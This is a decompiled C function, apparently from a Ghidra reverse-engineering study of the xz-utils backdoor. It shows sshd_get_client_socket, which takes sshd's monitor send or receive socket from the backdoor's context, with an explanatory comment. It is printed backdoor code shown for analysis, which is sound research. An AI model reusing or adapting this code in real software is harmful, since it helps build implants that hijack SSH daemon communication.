// /home/kali/xzre-ghidra/xzregh/107C60_sshd_get_client_socket.c
// Function: sshd_get_client_socket @ 0x107C60
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_client_socket(global_context_t * ctx, int * pSocket, int socket_index, SocketMode socket_direction)


/*
 * AutoDoc: Prefers using the recovered monitor struct: depending on DIR_READ/DIR_WRITE it fetches
 * monitor->m_sendfd or m_recvfd, verifies the fd by issuing a zero-length read that tolerates
 * EINTR, and returns it on success. If the monitor pointer is missing or the fd is bad/EBADF it
 * falls back to `sshd_get_usable_socket`'s fd scanner.
 */
#include "xzre_types.h"


BOOL sshd_get_client_socket
               (global_context_t *ctx,int *pSocket,int socket_index,SocketMode socket_direction)

{
  monitor *addr;
  BOOL BVar1;
  ssize_t sVar2;
  int *piVar3;
  libc_imports_t *plVar4;
  int fd;
  int *errno_ptr;
  monitor *monitor_ptr;
  int client_fd;
  
  if (((ctx == (global_context_t *)0x0) ||
      (plVar4 = ctx->libc_imports, plVar4 == (libc_imports_t *)0x0)) || (pSocket == (int *)0x0)) {
    return 0;
  }
  if (ctx->struct_monitor_ptr_address != (monitor **)0x0) {
    addr = *ctx->struct_monitor_ptr_address;
    BVar1 = is_range_mapped((u8 *)addr,4,ctx);
    if (BVar1 != 0) {
      if (socket_direction == DIR_WRITE) {
        fd = addr->m_recvfd;
      }
      else {
        if (socket_direction != DIR_READ) {
          return 0;
        }
        fd = addr->m_sendfd;
      }
      client_fd._0_1_ = 0;
      plVar4 = ctx->libc_imports;
      if (((-1 < fd) && (plVar4 != (libc_imports_t *)0x0)) &&
         ((plVar4->read != (_func_25 *)0x0 && (plVar4->__errno_location != (_func_26 *)0x0)))) {
        do {
          sVar2 = (*plVar4->read)(fd,&client_fd,0);
          piVar3 = (*plVar4->__errno_location)();
          if (-1 < (int)sVar2) goto LAB_00107d34;
        } while (*piVar3 == 4);
        if (*piVar3 != 9) {
LAB_00107d34:
          *pSocket = fd;
          return 1;
        }
      }
    }
    plVar4 = ctx->libc_imports;
  }
  BVar1 = sshd_get_usable_socket(pSocket,socket_index,plVar4);
  return BVar1;
}

